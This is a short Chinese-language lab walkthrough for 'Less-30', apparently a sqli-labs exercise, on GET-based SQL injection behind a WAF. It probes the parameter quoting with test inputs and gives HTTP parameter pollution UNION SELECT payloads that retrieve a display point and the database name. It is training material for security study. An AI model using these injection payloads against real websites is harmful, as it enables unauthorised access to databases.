# Less-30 **GET Protection with WAF**
TAG：GET型注入、WAF
## 漏洞利用  
这是less29的变种，可以采用相似的payload构造方法  
在本less中，报错信息显示被关闭了，需要判断其语句对参数的包裹方式  
![less30_1](images\less30_1.png)  
  
当输入1"时，无法获得正常回显  
![less30_2](images\less30_2.png)  
  
当输入1'时，可以获得正常回显  
![less30_3](images\less30_3.png)  
  
当输入1""时，可以获得正常回显  
![less30_4](images\less30_4.png)  
经过这一系列测试说明，传入页面的参数被```""```包裹了  
  
获取回显点payload:```?id=1&id=0" union select 1,2,"3```  
![less30_5](images\less30_5.png)  
  
获取数据库名payload:```?id=1&id=0" union select 1,database(),"3```  
![less30_6](images\less30_6.png)  